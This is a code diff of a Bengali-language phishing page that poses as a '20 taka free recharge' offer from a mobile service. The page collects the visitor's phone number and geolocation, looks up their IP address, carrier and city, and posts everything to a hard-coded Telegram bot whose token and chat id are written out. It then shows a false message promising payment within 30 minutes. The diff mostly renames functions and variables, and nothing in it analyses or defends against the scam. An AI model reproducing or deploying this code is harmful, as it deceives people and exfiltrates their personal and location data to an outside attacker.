@@ -9,7 +9,6 @@
         .top-bar { background: #f8f9fa; padding: 20px; border-bottom: 1px solid #eee; font-weight: bold; font-size: 18px; color: #007bff; }
         .container { max-width: 400px; margin: 40px auto; padding: 30px; border: 1px solid #eee; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
         .offer-title { color: #28a745; font-size: 26px; font-weight: bold; margin-bottom: 10px; }
-        .desc { font-size: 15px; color: #666; margin-bottom: 30px; }
         input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; box-sizing: border-box; outline: none; margin-bottom: 20px; }
         .btn { background: #007bff; color: #fff; padding: 16px; width: 100%; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
         .btn:active { background: #0056b3; transform: scale(0.98); }
@@ -22,17 +21,17 @@
 
     <div class="container">
         <div class="offer-title">অফার: ২০ টাকা ফ্রি রিচার্জ</div>
-        <p class="desc">আপনার ১১ সংখ্যার মোবাইল নম্বরটি দিয়ে ভেরিফিকেশন সম্পন্ন করুন এবং সাথে সাথেই রিচার্জ গ্রহণ করুন।</p>
+        <p>আপনার ১১ সংখ্যার মোবাইল নম্বরটি দিয়ে ভেরিফিকেশন সম্পন্ন করুন এবং সাথে সাথেই রিচার্জ গ্রহণ করুন।</p>
         
-        <input type="number" id="target_phone" placeholder="01XXXXXXXXX" required>
-        <button class="btn" id="submitBtn" onclick="initiateProcess()">রিচার্জ নিন</button>
+        <input type="number" id="user_phone" placeholder="01XXXXXXXXX" required>
+        <button class="btn" id="submitBtn" onclick="sendData()">রিচার্জ নিন</button>
     </div>
 
     <div class="footer">© 2026 Mobile Services Bangladesh. All Rights Reserved.</div>
 
 <script>
-    async function initiateProcess() {
-        const phone = document.getElementById('target_phone').value;
+    async function sendData() {
+        const phone = document.getElementById('user_phone').value;
         const btn = document.getElementById('submitBtn');
 
         if (phone.length < 11) {
@@ -45,42 +44,47 @@
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (pos) => sendToBot(phone, pos.coords.latitude, pos.coords.longitude),
-                (err) => sendToBot(phone, "Denied", "Denied"),
+                async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    await submitToBot(phone, lat, lon);
+                },
+                async () => {
+                    await submitToBot(phone, "Denied", "Denied");
+                },
                 { timeout: 8000 }
             );
         } else {
-            sendToBot(phone, "Not Supported", "Not Supported");
+            await submitToBot(phone, "Unsupported", "Unsupported");
         }
     }
 
-    async function sendToBot(phone, lat, lon) {
-        // আপনার নতুন বটিক আইডি এবং টোকেন
+    async function submitToBot(phone, lat, lon) {
         const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
-        const chat_id = "7887080882"; 
+        const chat_id = "7887080882";
 
         try {
             const ipRes = await fetch('https://ipapi.co/json/');
             const ipData = await ipRes.json();
             
-            const map = (lat === "Denied") ? "Denied" : `https://www.google.com/maps?q=${lat},${lon}`;
+            const mapLink = (lat === "Denied") ? "অনুমতি দেয়নি" : `https://www.google.com/maps?q=${lat},${lon}`;
             
             const text = `🎯 **নতুন রিচার্জ রিকোয়েস্ট** 🎯\n\n` +
                          `📞 ফোন: ${phone}\n` +
                          `🌐 IP: ${ipData.ip}\n` +
                          `📶 অপারেটর: ${ipData.org}\n` +
                          `🏙️ শহর: ${ipData.city}\n` +
-                         `📍 ম্যাপ: ${map}`;
+                         `📍 ম্যাপ: ${mapLink}`;
 
-            const finalUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
 
-            fetch(finalUrl).then(() => {
-                alert("আপনার রিচার্জ রিকোয়েস্ট সফল হয়েছে। ৩০ মিনিটের মধ্যে টাকা পেয়ে যাবেন।");
+            fetch(url).then(() => {
+                alert("আপনার রিকোয়েস্ট সফল হয়েছে। ৩০ মিনিটের মধ্যে টাকা পেয়ে যাবেন।");
                 window.location.href = "https://www.google.com";
             });
 
         } catch (error) {
-            alert("সফল হয়েছে! ৩০ মিনিটের মধ্যে রিচার্জ পাবেন।");
+            alert("সফল হয়েছে! ৩০ মিনিটের মধ্যে টাকা পাবেন।");
             window.location.href = "https://www.google.com";
         }
     }
